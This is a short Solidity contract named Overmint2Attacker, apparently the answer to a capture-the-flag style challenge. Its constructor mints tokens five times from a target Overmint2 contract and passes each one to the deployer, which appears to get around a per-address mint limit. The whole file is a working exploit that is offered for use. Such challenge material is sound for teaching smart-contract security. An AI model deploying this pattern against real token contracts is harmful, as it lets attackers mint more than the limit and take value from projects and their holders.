// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import './Overmint2.sol';

contract Overmint2Attacker {

    constructor(address _vic){

         for(uint256 i = 0;  i < 5; i++){
            Overmint2(_vic).mint();
            Overmint2(_vic).transferFrom(address(this), msg.sender, i + 1);
        }
    }
}